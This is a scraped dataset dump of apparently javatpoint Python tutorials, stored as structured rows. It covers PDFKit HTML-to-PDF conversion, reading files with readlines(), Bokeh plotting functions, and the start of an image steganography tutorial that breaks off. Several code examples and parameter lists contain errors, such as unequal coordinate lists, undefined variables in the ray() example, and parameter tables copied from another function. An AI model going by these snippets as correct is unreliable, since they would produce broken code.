PDF format files using the PDFKit module in the Python programming language with different examples.', 'The Python PDFKit module allows the programmers to convert a local HTML file into a PDF format using the from_file() function. Let us consider the following example demonstrating the same:', 'We can also convert the Website URL to a PDF file using the Python PDFKit module with the help of the from_url() function. Let us consider the following example demonstrating the same:', 'Moreover, the PDFKit module allows programmers to store strings to PDF files using the from_url() function. Let us consider the following example illustrating the same:']","['Python offers various approaches to generating a PDF file; however, PDFKit lies among some best approaches. PDFKit works as a wrapper for the wkhtmltopdf tool that allows the programmers to convert an HTML file into PDF format with the help of Webkit. It renders HTML into PDF with different image formats, HTML forms, and other complex printable documents.', ""In order to install the Python module, we need 'pip', a framework to manage packages required to install the modules from the trusted public repositories. Once we have 'pip', we can install the PDFKit module using the command from a Windows command prompt (CMD) or terminal as shown below:"", 'If the above Python program file does not return any error, the module is installed properly. However, in the case where an exception is raised, try reinstalling the module, and it is also recommended to refer to the official documentation of the module.', 'In the above snippet of code, we have imported the required module. We have then defined a variable as config that stores the address to the execution file of the wkhtmltopdf tool using the configuration() function. We have then used the from_file() function of the PDFKit module specifying the parameters as the address of the html file, location of the PDF file to be stored, and configuration.', 'In the above snippet of code, we have imported the required module. We have then defined a variable as config that stores the address to the execution file of the wkhtmltopdf tool using the configuration() function. We have then used the from_url() function of the PDFKit module specifying the parameters as the URL, location of the PDF file to be stored, and configuration.', 'In the above snippet of code, we have imported the required module. We have then defined a variable as config that stores the address to the execution file of the wkhtmltopdf tool using the configuration() function. We have then used the from_string() function of the PDFKit module specifying the parameters as the string variable, location of the PDF file to be stored, and configuration.']","['$ pip install pdfkit', '$ sudo apt-get install wkhtmltopdf', 'import pdfkit', '$ python test_file.py', '# importing the required module', 'import pdfkit', '# configuring pdfkit to point to our installation of wkhtmltopdf', 'config = pdfkit.configuration(wkhtmltopdf = r""C:\\\\Program Files\\\\wkhtmltopdf\\\\bin\\\\wkhtmltopdf.exe"")', '# converting html file to pdf file', ""pdfkit.from_file('sample.html', 'output.pdf', configuration = config)"", 'import pdfkit', '# configuring pdfkit to point to our installation of wkhtmltopdf', 'config = pdfkit.configuration(wkhtmltopdf = r""C:\\\\Program Files\\\\wkhtmltopdf\\\\bin\\\\wkhtmltopdf.exe"")', '# converting url to pdf file', ""pdfkit.from_url('https://www.javatpoint.com/tic-tac-toe-in-python', 'output2.pdf', configuration = config)"", '# importing the required module', 'import pdfkit', '# configuring pdfkit to point to our installation of wkhtmltopdf', 'config = pdfkit.configuration(wkhtmltopdf = r""C:\\\\Program Files\\\\wkhtmltopdf\\\\bin\\\\wkhtmltopdf.exe"")', 'my_string = """"""', '<html>', '<head>', '<body>', '<div class = ""container"">', '<h1>STRING TO PDF</h1>', '<p>This is my sample string that I wanted to stored in a PDF file</p>', '</div>', '</body>', '</head>', '</html>', '# storing string to pdf file', ""pdfkit.from_string(my_string, 'output3.pdf', configuration = config)""]",[],[],[]
399,['Readlines in Python'],"[""Python programming language has various inbuilt functions for writing, creating, and reading files. Two types of files are handled in Python, which is normal text files, and the second one is binary files mainly written in binary language that is 0's and 1's.""]","['https://www.javatpoint.com/how-to-plot-multiple-lines-on-a-graph-using-bokeh-in-python', 'https://www.javatpoint.com/converting-html-to-pdf-files-using-python', 'https://www.javatpoint.com/how-to-plot-multiple-lines-on-a-graph-using-bokeh-in-python', 'https://www.javatpoint.com/converting-html-to-pdf-files-using-python', 'https://www.javatpoint.com/how-to-plot-multiple-lines-on-a-graph-using-bokeh-in-python']","['https://static.javatpoint.com/python/images/readlines-in-python1.png', 'https://static.javatpoint.com/python/images/readlines-in-python2.png', 'https://static.javatpoint.com/python/images/readlines-in-python3.png', 'https://static.javatpoint.com/python/images/readlines-in-python4.png']",[],"['Python File concept', 'Examples of reading a file in Python:']",[],[],"['Certain basic steps to be performed in a file:', 'Here the file access modes are as follows:', 'For example, if we have a file named hello.txt and we want to open it in write mode, then we can use it as:', 'File1 = open ( "" hello.txt "" , "" w "" )', 'For example, if we have a file named hello.txt and we want to open it in write mode, then we can use it as:', 'Now let us understand the concept of reading a file in detail with the help of an example:', 'Example 1:', 'Reading a file using readlines ( ) function', 'The output of the above example:', 'Example 2:', 'Reading a file using readline ( ) function', 'The output of the above example:', 'Example 3:', 'Reading a file using simple for loop:', 'The output of the above example:', 'Example 4:', ""Reading a file using ' with ' statement:"", 'The output of the above example:']","['Opening a file: Opening a file is done using the open ( ) function; while using this function, we must pass the file name and Access mode as an argument.', 'Writing in a file: As the name suggests, we can easily predict what we are required to write in a file in this method. There are two ways to write in a file:']","['Closing a file: Close function is used to free up the memory space required by the file; this method is when there is no longer need for the file or if we want to close the entire file and want to open the file in a different mode. It is performed by using the close ( ) function, and inside this function, we are not required to pass any argument; this function can be accessed using the file name and supplied by the dot close function.', 'Reading from a file: Similarly, in this, we can predict that what we have to do in this; even in this tutorial, we are going to read among one of the reading methods in detail. In this method, we need to read the data from the particular file. There are three ways for reading the data from the file:', 'In this method, we are not using the readline ( ) function and not even using the readlines ( ) function, as we have already seen the use of both of the functions in the above examples; in this method, we will use the for loop for printing the data of the file. We will iterate the objects of the file and read a file line by line, although we are using some python predefined built-in functions. Using these built-in Python functions, we can easily iterate over the file object implicitly using a for loop, in combination with using the iterable object.', 'If we notice the above 3 examples, we can easily observe that every time whenever the file needs to be open, then it is required to be closed; if we do not close the file, then it will create several bugs in the program because many changes not done in the file or come into effect until we do not close the file. ', ""So, to overcome this problem, we will use the ' with ' statement, which is mainly used in exception handling in Python, to make the code clearer and much more readable. Here, in this example, you can easily observe that we are not using the file.close ( ) function, again and again, to prevent the file, using it can be automatically done with the statement. Hence it reduces lines of code and makes the program faster to run and implement more efficiently.""]","['# Python program to implement the file concept using readlines ( ) for reading a file', 'Fruits = [""Apple\\n"", ""Orange\\n"", ""Banana\\n""]', '# writing to file', ""file = open('hello.txt', 'w')"", 'file.writelines(Fruits)                              # writelines is used to write the data into the file in                                                # the form of a list, by inserting multiple values at the same time,', '# here, we are taking the hello.txt file', 'file.close()                                           # This instruction is used to close the file, i.e., hello.txt', '# Using readlines()', ""file = open('hello.txt', 'r')"", 'Statements = file.readlines()', 'count = 0', '# Strips the newline character', 'for line in Statements:                                     # Using for loop to print the data of the file', 'count = count + 1', 'print(""Statement{}: {}"".format(count, line.strip()))', '# Python program to implement the file concept using readline() for reading a file', 'Fruit = [ ""Apple\\n"" , ""Graphs\\n"" , ""Mango\\n"" , ""Orange\\n"" , ""Kiwi\\n"" ]', '# Writing to a file', ""file1 = open('new.txt', 'w')"", 'file1.writelines((Fruit))                          # writelines is used to write the data into the file in                                                # the form of list, by inserting multiple values at a same time,', '# here we are taking new.txt file', '', 'file1.close()                                       # This instruction is used to close the file, i.e., hello.txt', '', '# Using readline()', ""file1 = open('new.txt', 'r')"", 'count = 0', 'while True:', 'count = count + 1', '# Get next line from file', 's = file1.readline()', '# if line is empty', '# end of file is reached', 'if not s:', 'break', 'print(""Statement{}: {}"".format(count, s.strip()))', 'file1.close()', '## Python program to implement the file concept using the simple for loop for reading a file', 'Fruits = [""Apple \\n"", "" Orange \\n"", ""Banana \\n"", ""Mango\\n"", ""Pineapple\\n"" ]', '# Writing to file', ""file2 = open('file2.txt', 'w')"", 'file2.writelines(Fruits)           # writelines is used to write the data into the file in', '# the form of list, by inserting multiple values at a same time,', '# here we are taking file2.txt file', 'file2.close()                                        # This instruction is used to close the file, i.e., hello.txt', '', '# Opening file', ""file2 = open('file2.txt', 'r')"", 'count = 0', '# Using for loop', 'print(""Using for loop"")', 'for line in file2:', 'count = count + 1', 'print(""Statement{}: {}"".format(count, line.strip()))', '# Closing files', 'file2.close()', '# Python program to implement the file concept using with statement for reading a file', 'Veges = [""Potato\\n"", ""Onion\\n"", ""Tomamto\\n""]', '# Writing to file', 'with open(""file3.txt"", ""w"") as file:', 'file.writelines(Veges)             # writelines is used to write the data into the file in', '# the form of list, by inserting multiple values at a same time,', '# here we are taking file3.txt file', '# using readlines()', 'count = 0', 'print(""Using readlines()"")', 'with open(""file3.txt"") as file:', 'Statements = file.readlines()', 'for line in Statements:', 'count = count + 1', 'print(""Satement{}: {}"".format(count, line.strip()))', '# Using readline()', 'count = 0', 'print(""\\nUsing readline()"")', 'with open(""file3.txt"") as file:', 'while True:', 'count = count + 1', 'line = file.readline()', 'if not line:', 'break', 'print(""Statement{}: {}"".format(count, line.strip()))', '# Using for loop', 'count = 0', 'print(""\\n Using for loop"")', 'with open(""file3.txt"") as file:', 'for line in file:', 'count = count + 1', 'print(""Statements{}: {}"".format(count, line.strip()))']",[],[],"['|||Readlines ( ) is a function that is used in Python to read a particular file line by line in a single go.|||It is very useful in reducing the time complexity while reading a file using the brute force approach and using loops and different iterations.|||It is a one-line code and simple function, which much better than using many loops for just reading a file.|||In C programming, reading a file is quite a tough task, but it is very easy to implement due to this readlines ( ) function in Python.|||readlines ( ) function reads only one complete line from the given file; after reading, it returns the whole line containing all elements in the form of a list.|||If we want to open the file in normal read mode, readline ( ) function will return us the string.|||If we want to open the file in binary mode, then readline ( ) function will return you a binary object.|||It is also very beneficial to appends a newline ( "" \\n "" ) at the end of the line.|||This readlines ( ) function is mostly suitable for small-sized files, containing fewer data to read the whole file within less time easily.|||It first reads the file\'s content to a memory in a single go and then separates them into various lines. With the help of the strip ( ) function, we can iterate over the whole list, which has been generated by the readline ( ) function, and by using the strip ( ) function, we can strip the newline \' \\n \' character.|||&&&|||Text files: These files contain the data in the form of text, which is terminated with a special character called EOL ( end of a line ), the new line character ( \' \\n \' ) in Python by default.|||Binary files: These types of files contain the data in the form of binary sequences, consisting of mainly 0\'s and 1\'s.||||||Read-only ( r ): It is used to read the data from the file. It is positioning the beginning of the file. If the file mentioned is not present, it will generate an input/output error. Read-only is the default mode of opening the file; while using this mode, we cannot edit the data of the file or cannot write it into the file.|||Write only ( \' w \' ): It is used to write the data into the file, positioning the beginning of the file. If the file mentioned is not present, then it will generate an input/output error. While using this mode, we cannot read the data from the file.|||Read and Write ( \' r+ \' ): This mode is used for writing and reading the data from the file. If we compare it with the previous mode, we can distinguish that we cannot write into the file in the read-only mode, but we can read and write into the file in this mode.|||||||||Write ( ): In this function, we must pass a single argument, the string we want to insert into the file.|||For example, if we have a file named hello.txt and we want to open it in write mode, then we can use it as:|||File1 = open ( "" hello.txt "" , "" w "" )|||File1.write ( str )|||Here, str is the string that we want to insert into the file.|||||||||Writelines ( ): In this function, we must pass an array or a list consisting of multiple strings. It is used to insert multiple various strings into the file at a single time.|||For example, if we have a file named hello.txt and we want to open it in write mode, then we can use it as:|||File1 = open ( "" hello.txt "" , "" w "" )|||File1.writelines( S ) for S = [ str1 , str2 , str3 ]|||||||||Read ( ): Returns the read bytes in the form of a string. Reads n bytes; if n is not specified, then reads the entire file.|||Readline ( ): Reads a line of the file and returns in the form of a string. For specified n, reads at most n bytes. readline ( ) function does not read more than one line at a time; even if n exceeds, it reads only one line. Readline ( ) function reads a line of the file and returns it in the string. It takes an integer value n as a parameter to read the number of characters read at a time. Readline ( ) method is very efficient in reading the data from a very large file because it fetches the data line by line and returns and prints on the screen. Readline ( ) returns the next line of the file, which contains a newline character in the end. Also, if the end of the file is reached, it will return an empty string.|||readlines ( ): Reads all the lines and returns them as a string element in a list. Readlines ( ) is used to read all the lines at a single go and then return them as a string element in a list. This function can be used for small files, as it reads the whole file content to the memory, then splits it into separate lines. Using the strip () function, we can iterate over the list and strip the newline \' \\n \' character using the strip ( ) function.|||']"
400,['How to Plot Multiple Lines on a Graph Using Bokeh in Python'],"['Bokeh is a library of Python used for data visualization, and it develops its plots using JavaScript and HTML platforms. And it also targets modern website browsers to provide presentation elegant, concise construction of novel graphics good high-performance interactivity.']","['https://www.javatpoint.com/bokeh-plotting-figure-circle_x-function-in-python', 'https://www.javatpoint.com/readlines-in-python', 'https://www.javatpoint.com/bokeh-plotting-figure-circle_x-function-in-python', 'https://www.javatpoint.com/readlines-in-python', 'https://www.javatpoint.com/bokeh-plotting-figure-circle_x-function-in-python']","['https://static.javatpoint.com/python/images/how-to-plot-multiple-lines-on-a-graph-using-bokeh-in-python.png', 'https://static.javatpoint.com/python/images/how-to-plot-multiple-lines-on-a-graph-using-bokeh-in-python2.png']",[],"['plotting.figure.multi_line()', 'Conclusion']","['Syntax:', 'Parameters:', 'Other Parameters:', 'Return:', 'Example 1:', 'Example 2:']",[],"['The syntax for multi_line() function is:', 'The return of multi_line() function is:', '""An object of class GlyphRenderer"".', 'In this example, we will see how we can use the default values for plotting multiple lines on the graph.', 'In this example, we will see how we can plot the multiple lines on the graph with various other parameters.', 'In this tutorial, we discussed how we can plot multiple lines on a graph using the Bokeh library in Python.']","['In this tutorial, we will learn how to plot multiple lines on a graph using the bokeh library. For this, we will be using the multi_line() function of the bokeh.plotting module.']",[],"['multi_line(parameters)', '# First, we will import all the required modules', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', '', '# Here, we will create a file for saving the model', 'OF(""javaTpoint.html"")', '', '# Now, we will instantiate the figure object', 'graph_1 = fig(title = ""Multiple Lines on Graph using Bokeh"")', '# the points to be plotted on Graph', 'xs = [[2, 3, 6, 1, 4], [-2, -1, 3, 0, 5]]', 'ys = [[1, 5, 3, 6], [2, -5, 9, -1, 6]]', '# Here, we will plot the graph', 'graph_1.multi_line(xs, ys)', '# To display the model', 'show(graph_1)', '# First, we will import all the required modules', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', 'from bokeh.palettes import magma as MG', '# Here, we will create a file for saving the model', 'OF(""javaTpoint.html"")', '', '# Now, we will instantiate the figure object', 'graph_1 = fig(title = ""Multiple Lines on Graph using Bokeh"")', '# Here, we will name of the x-axis', 'graph_1.xaxis.axis_label = ""x-axis of Graph""', '# here, we will name of the y-axis', 'graph_1.yaxis.axis_label = ""y-axis of Graph""', '# the points to be plotted', 'x = [K for K in range(-100, 101)]', 'x.reverse()', 'xs = [[K, 0] for K in x]', 'y1 = [K for K in range(1, 101)]', 'y1.reverse()', 'y = [K for K in range(1, 101)] + [0] + y1', 'ys = [[0, K] for K in y]', '# Defineing color of the lines', 'line_color = MG(201)', '# Here, we will plot the graph', 'graph_1.multi_line(xs, ys,', 'line_color = line_color)', '', '# To display the model', 'show(graph_1)']",[],[],"['|||xs: This is an x-coordinates of the lines.|||ys: This is a y-coordinates of the lines.|||line_alpha: It takes the percentage value of line alpha; Its default value is 1.|||line_cap: It takes the value of line cap for the line; Its default value is butt.|||line_color: It takes the color of the line as input; Its default value is black.|||line_dash: It takes the value of line dash such as solid, dashed, dotted, dot-dash, dash-dot [Its default value is solid].|||line_dash_offset: It takes the value of line dash offset as input; Its default value is 0.|||line_join: It takes the value of line join as input; Its default value is in bevel.|||line_width: It takes the value of the width of the line as input; Its default value is 1.|||name: It takes a user-supplied name for the model as input.|||tags: It takes user-supplied values for the model as input.||||||alpha: It is used for setting all alpha keyword arguments at once.|||color: It is used for setting all color keyword arguments at once.|||legend_field: It takes the name of a column as input in the data source that should be used.|||legend_group: It takes the name of a column as input in the data source that should be used.|||legend_label: It is used for labeling the legend entry.|||muted: It is used for determining whether the glyph should be rendered as muted or not; Its default value is False.|||name: It is used as an optional user-supplied name for attaching to the renderer.|||source: It is a user-supplying data source.|||view: It is used to view for filtering the data source.|||visible: It is used for determining whether the glyph should be rendered or not; Its default value is True.|||x_range_name: It is used as the name of an extra range to use for mapping x-coordinates.|||y_range_name: It is used as the name of an extra range to use for mapping y-coordinates.|||level: It is used for specifying the render level order for this glyph.|||']"
401,['bokeh.plotting.figure.circle_x() Function in Python'],"['Bokeh is a library of Python which is used for data visualization by plotting graphs and charts. The output can be obtained on different platforms such as Notebook, HTML, JavaScript, and browser. The Figure Class is used for creating a new figure on the graph, and it is a subclass of bokeh.plotting that simplifies plot creation with default axes, grids, tools, etc.']","['https://www.javatpoint.com/bokeh-plotting-figure-diamond_cross-function-in-python', 'https://www.javatpoint.com/how-to-plot-multiple-lines-on-a-graph-using-bokeh-in-python', 'https://www.javatpoint.com/bokeh-plotting-figure-diamond_cross-function-in-python', 'https://www.javatpoint.com/how-to-plot-multiple-lines-on-a-graph-using-bokeh-in-python', 'https://www.javatpoint.com/bokeh-plotting-figure-diamond_cross-function-in-python']","['https://static.javatpoint.com/python/images/bokeh-plotting-figure-circle_x-function-in-python.png', 'https://static.javatpoint.com/python/images/bokeh-plotting-figure-circle_x-function-in-python2.png']",[],"['bokeh.plotting.figure.circle_x() Function', 'Conclusion']","['Syntax:', 'Parameters:', 'Other Parameters:', 'Return:', 'Example 1:', 'Example 2:']",[],"['We can use the circle_x() method of bokeh.plotting module of bokeh library for Configuring and adding circle_x glyphs to this Graphs.', 'The syntax of circle_x() function is:', 'The return of circle_x() function is:', 'Below examples illustrate the bokeh.plotting.figure.circle_x() function in bokeh.plotting:', 'In this tutorial, we discussed, with the help of examples, the use of bokeh.plotting.figure.circle_x() Function in Python.']",[],[],"[""circle_x(x, y, size = 4, angle = 0.0, *, angle_units = 'rad', fill_alpha = 1.0, fill_color = 'gray', line_alpha = 1.0, line_cap = 'butt', line_color = 'black', line_dash = [], line_dash_offset = 0, line_join = 'bevel', line_width = 1, name = None, tags = [], **wars)"", '# First, we will import all the required modules', 'import numpy as np', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', '# Here, we will create a file for saving the model', 'OF(""javaTpoint.html"")', '', '# Now, we will instantiate the figure object', 'plot_1 = fig(plot_width = 300, plot_height = 300, title = ""Circle figure on Graph using Bokeh"")', 'plot_1.circle_x(x = [2, 4, 7], y = [5, 3, 6], size = 20,', 'color =""red"", alpha = 0.8)', 'show(plot_1)', '# First, we will import all the required modules', 'import numpy as nmp', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', 'x = [4, 1, 7, 2, 6]', 'y = [5, 1, 4, 6, 2]', '# Here, we will create a file for saving the model', 'OF(""javaTpoint.html"")', '', '# Now, we will instantiate the figure object', 'plot_1 = fig(plot_width = 300, plot_height = 300, title = ""Circle figure on Graph using Bokeh"")', '# add both a line and circles on the same plot', 'plot_1.line(x, y, line_width = 2)', 'plot_1.circle_x(x, y, fill_color = ""blue"",', 'line_color =""yellow"", size = 10)', 'show(plot_1)']",[],[],"['|||xs: This is an x-coordinates of the lines.|||ys: This is a y-coordinates of the lines.|||line_alpha: It takes the percentage value of line alpha; Its default value is 1.|||line_cap: It takes the value of line cap for the line; Its default value is butt.|||line_color: It takes the color of the line as input; Its default value is black.|||line_dash: It takes the value of line dash such as solid, dashed, dotted, dot-dash, dash-dot [Its default value is solid].|||line_dash_offset: It takes the value of line dash offset as input; Its default value is 0.|||line_join: It takes the value of line join as input; Its default value is in bevel.|||line_width: It takes the value of the width of the line as input; Its default value is 1.|||mode: It takes one of three values of mode as input: [""before"", ""after"", ""centre""].|||name: It takes a user-supplied name for the model as input.|||tags: It takes user-supplied values for the model as input.||||||alpha: It is used for setting all alpha keyword arguments at once.|||color: It is used for setting all color keyword arguments at once.|||legend_field: It takes the name of a column as input in the data source that should be used.|||legend_group: It takes the name of a column as input in the data source that should be used.|||legend_label: It is used for labeling the legend entry.|||muted: It is used for determining whether the glyph should be rendered as muted or not; Its default value is False.|||name: It is used as an optional user-supplied name for attaching to the renderer.|||source: It is a user-supplying data source.|||view: It is used to view for filtering the data source.|||visible: It is used for determining whether the glyph should be rendered or not; Its default value is True.|||x_range_name: It is used as the name of an extra range to use for mapping x-coordinates.|||y_range_name: It is used as the name of an extra range to use for mapping y-coordinates.|||level: It is used for specifying the render level order for this glyph.|||']"
402,['bokeh.plotting.figure.diamond_cross() Function in Python'],"['Bokeh is a library of Python which is used for data visualization by plotting graphs and charts. The output can be obtained on different platforms such as Notebook, HTML, JavaScript, and browser. The Figure Class is used for creating a new figure on the graph, and it is a subclass of bokeh.plotting that simplifies plot creation with default axes, grids, tools, etc.']","['https://www.javatpoint.com/how-to-plot-rays-on-a-graph-using-bokeh-in-python', 'https://www.javatpoint.com/bokeh-plotting-figure-circle_x-function-in-python', 'https://www.javatpoint.com/how-to-plot-rays-on-a-graph-using-bokeh-in-python', 'https://www.javatpoint.com/bokeh-plotting-figure-circle_x-function-in-python', 'https://www.javatpoint.com/how-to-plot-rays-on-a-graph-using-bokeh-in-python']","['https://static.javatpoint.com/python/images/bokeh-plotting-figure-diamond_cross-function-in-python.png', 'https://static.javatpoint.com/python/images/bokeh-plotting-figure-diamond_cross-function-in-python2.png']",[],"['bokeh.plotting.figure.diamond_cross() Function', 'Conclusion']","['Syntax:', 'Parameters:', 'Other Parameters:', 'Return:', 'Example 1:', 'Example 2:']",[],"['We can use the diamond_cross() method of bokeh.plotting module of bokeh library for Configuring and adding DiamondCross glyphs to this Graphs.', 'The syntax of diamond_cross() function is:', 'The return of diamond_cross() function is:', 'Below examples illustrate the bokeh.plotting.figure.diamond_cross() function in bokeh.plotting:', 'In this tutorial, we discussed, with the help of examples, the use of bokeh.plotting.figure.diamond_cross() Function in Python.']",[],[],"[""diamond_cross(x, y, size = 4, angle = 0.0, *, angle_units = 'rad', fill_alpha = 1.0, fill_color = 'gray', line_alpha = 1.0, line_cap = 'butt', line_color = 'black', line_dash = [], line_dash_offset = 0, line_join = 'bevel', line_width = 1, name = None, tags = [], **kwargs)"", '# First, we will import all the required modules', 'import numpy as nmp', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', '# Here, we will create a file for saving the model', 'OF(""javaTpoint.html"")', '', '# Now, we will instantiate the figure object', 'plot_1 = fig(plot_width = 300, plot_height = 300, title = ""Diamond figure on Graph using Bokeh"")', 'plot_1.diamond_cross(x = [3, 1, 6, 2, 8], y = [1, 6, 3, 4, 7],', 'size = 20, fill_color = ""Blue"",', 'line_color = ""Yellow"", alpha = 1.0)', '# To display the model', 'show(plot_1)', '# First, we will import all the required modules', 'import numpy as nmp', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', 'x = [4, 1, 7, 2, 6]', 'y = [5, 1, 4, 6, 2]', '# Here, we will create a file for saving the model', 'OF(""javaTpoint.html"")', '', '# Now, we will instantiate the figure object', 'plot_1 = fig(plot_width = 300, plot_height = 300, title = ""Diamond figure on Graph using Bokeh"")', 'plot_1.line(x, y, line_width = 2)', 'plot_1.diamond_cross(x, y, fill_color = ""Orange"",', 'line_color = ""Black"", size = 28)', 'show(plot_1)']",[],[],"['|||xs: This is an x-coordinates of the lines.|||ys: This is a y-coordinates of the lines.|||line_alpha: It takes the percentage value of line alpha; Its default value is 1.|||line_cap: It takes the value of line cap for the line; Its default value is butt.|||line_color: It takes the color of the line as input; Its default value is black.|||line_dash: It takes the value of line dash such as solid, dashed, dotted, dot-dash, dash-dot [Its default value is solid].|||line_dash_offset: It takes the value of line dash offset as input; Its default value is 0.|||line_join: It takes the value of line join as input; Its default value is in bevel.|||line_width: It takes the value of the width of the line as input; Its default value is 1.|||mode: It takes one of three values of mode as input: [""before"", ""after"", ""centre""].|||name: It takes a user-supplied name for the model as input.|||tags: It takes user-supplied values for the model as input.||||||alpha: It is used for setting all alpha keyword arguments at once.|||color: It is used for setting all color keyword arguments at once.|||legend_field: It takes the name of a column as input in the data source that should be used.|||legend_group: It takes the name of a column as input in the data source that should be used.|||legend_label: It is used for labeling the legend entry.|||muted: It is used for determining whether the glyph should be rendered as muted or not; Its default value is False.|||name: It is used as an optional user-supplied name for attaching to the renderer.|||source: It is a user-supplying data source.|||view: It is used to view for filtering the data source.|||visible: It is used for determining whether the glyph should be rendered or not; Its default value is True.|||x_range_name: It is used as the name of an extra range to use for mapping x-coordinates.|||y_range_name: It is used as the name of an extra range to use for mapping y-coordinates.|||level: It is used for specifying the render level order for this glyph.|||']"
403,['How to Plot Rays on a Graph using Bokeh in Python'],"['Bokeh is a Python library which is used for data visualization. It creates its plots using HTML and JavaScript languages, and it also targets modern website browsers to provide presentation elegant, concise construction of novel graphics good high-performance interactivity.']","['https://www.javatpoint.com/image-steganography-using-python', 'https://www.javatpoint.com/bokeh-plotting-figure-diamond_cross-function-in-python', 'https://www.javatpoint.com/image-steganography-using-python', 'https://www.javatpoint.com/bokeh-plotting-figure-diamond_cross-function-in-python', 'https://www.javatpoint.com/image-steganography-using-python']","['https://static.javatpoint.com/python/images/how-to-plot-rays-on-a-graph-using-bokeh-in-python.png', 'https://static.javatpoint.com/python/images/how-to-plot-rays-on-a-graph-using-bokeh-in-python2.png']",[],"['plotting.figure.ray()', 'Conclusion']","['Syntax:', 'Parameters:', 'Returns:', 'Example 1:', 'Example 2:']",[],"['In this tutorial, we will learn how to plot rays on a graph. To plot rays on a graph we can use the ray() function of the bokeh.plotting module.', 'The syntax for ray() function is:', 'The parameters of ray() function are:', 'The return of ray() function is:', 'In this example we will be using the default values for plotting the graph.', 'In this example we will be plotting multiple rays with various other parameters.', 'In this tutorial, we discussed how to plot rays on Graph using the bokeh library in Python.']",[],[],"['ray(parameters)', '# First, we will import all the required modules', 'import numpy as nmp', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', '# Here, we will create a file for saving the model', 'OF(""javaTpoint.html"")', '', '# Now, we will instantiate the figure object', 'graph_1 = fig(title = ""Rays on Graph using Bokeh"")', '# the points to be plotted', '# Here, we will plot the graph', 'graph_1.ray(x, y)', '# To display the model', 'show(graph_1)', '# First, we will import all the required modules', 'import numpy as nmp', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', 'from bokeh.palettes import magma as MG', '# Here, we will create a file for saving the model', 'OF(""javaTpoint.html"")', '', '# Now, we will instantiate the figure object', 'graph_1 = fig(title = ""Rays on Graph using Bokeh"")', '# Name of the x-axis', 'graph_1.xaxis.axis_label = ""x-axis of Graph""', '', '# Name of the y-axis', 'graph_1.yaxis.axis_label = ""y-axis of Graph""', '# The points to be plotted', 'x = [0] * 254', 'y = [0] * 254', '# Now, we will instantiate angles of the rays', 'angle = nmp.linspace(0.00, 6.28, num = 254).tolist()', '# color of the rays', 'color = MG(254)', '# Here, we will plot the graph', 'graph_1.ray(x, y,', 'angle = angle,', 'color = color)', '# To display the model', 'show(graph_1)']",[],[],['|||x: It takes x-coordinate values of the starting points of the rays.|||y: It takes y-coordinate values of the starting points of the rays|||length: It takes value of ray length as input.|||length_units: It takes unit of the length of the rays.|||']
404,['Image Steganography using Python'],"['The modern world of computation revolves around the word ""Data"". However, why is data so fascinating? In this modern world, people are starting to realize the significance of the data in order to expand the scope of their businesses. Business owners used data to potentially predict customer trends, increase sales, and push the organization to newer heights. With the help of the rapid advancement in technology and data for nonstop revolution, it has become the chief importance to secure data. Data sharing has also increased as thousands of messages and data are being transmitted on the internet day-to-day from one place to another. Data protection is the key concern of the sender, and, significantly, we encrypt the message in a secret method that only the receiver can understand.']","['https://www.javatpoint.com/inconsistent-use-of-tabs-and-spaces-in-indentation', 'https://www.javatpoint.com/how-to-plot-rays-on-a-graph-using-bokeh-in-python', 'https://www.javatpoint.com/inconsistent-use-of-tabs-and-spaces-in-indentation', 'https://www.javatpoint.com/how-to-plot-rays-on-a-graph-using-bokeh-in-python', 'https://www.javatpoint.com/inconsistent-use-of-tabs-and-spaces-in-indentation']","['https://static.javatpoint.com/python/images/image-steganography-using-python.png', 'https://static.javatpoint.com/python/images/image-steganography-using-python2.png', 'https://static.javatpoint.com/python/images/image-steganography-using-python3.png', 'https://static.javatpoint.com/python/images/image-steganography-using-python4.png', 'https://static.javatpoint.com/python/images/image-steganography-using-python5.png']",[],"['Understanding the concept of Steganography', 'Understanding the benefits of using Steganography over Cryptography', 'Understanding the types of Steganography', 'Basic Model of Steganography', 'Understanding the Least Significant Bit Steganography', 'Understanding the working of the Least Significant Bit technique', 'Hiding Text within an Image using Python', 'The Complete Program']","['Importing the Python libraries', 'Converting Types to Binary', 'Hiding Secret Data in the Image', 'Decoding the hidden message from the Steganographic image', 'Encoding the message', 'Decoding the message', 'The main function']",[],"['The works of Steganography have been carried out on various transmission media, categorizing it into different types:', 'Now, let us understand the basic model of Steganography', 'LSB (or Least Significant Bit) is a method where we can modify the last bit of every pixel, replacing them with the data bit of the secret message.', 'The following section mainly focuses on the step-by-step approach of the hide and reveal process with the help of a Python script.', 'The steps for this approach are as follows:', 'Step 1: Importing all the required Python libraries.', 'Step 3: Defining another function to hide a secret message in the image by changing the LSB.', 'Step 4: Writing a function to decode the hidden message from the Steganographic image.', ""Step 5: Writing another function that accepts the user's image name and secret message and calls the hide_data() function to encode the message."", 'Step 7: Defining the main function.', 'Let us see the above steps in action:', 'Let us consider the following Python script to understand the same:', 'Explanation:', 'In the above snippet of code, we have imported the OpenCV library along with the NumPy and types libraries.', 'Let us consider the following Python script to understand the same:', 'Explanation:', 'Let us consider the following script to understand the same:', 'Explanation:', 'Explanation:', 'Let us consider the following script to understand the same:', 'Explanation:', 'Let us consider the following Python script illustrates the same:', 'Explanation:', 'Let us consider the following Python script demonstrating the same:', '# image ste', 'Explanation:', 'Let us see the complete program code and the output after its execution.', 'File: imgSteganography.py', 'Output for Data Encoding:', 'Output for Data Decoding:']","['In the following tutorial, we will understand the concept of Steganography along with its practical implementation using the Python programming language.', 'This tutorial will support us in implementing image steganography with the help of the Python programming language. It will help us write Python script in order to hide text messages using a technique known as Least Significant Bit.', ""Step 2: Defining a function to convert any type of data into binary, we will use this to convert the secret data and pixels' values into binary in the encoding and decoding phase. "", 'Step 6: Defining a function to ask the user to enter the image name that requires decoded and call the show_data() function to return the decoded message.', 'We will start by importing the necessary libraries that we need for the project. If any of the used libraries are not found in the system, install it using the pip installer.', 'Now we will define a function in order to 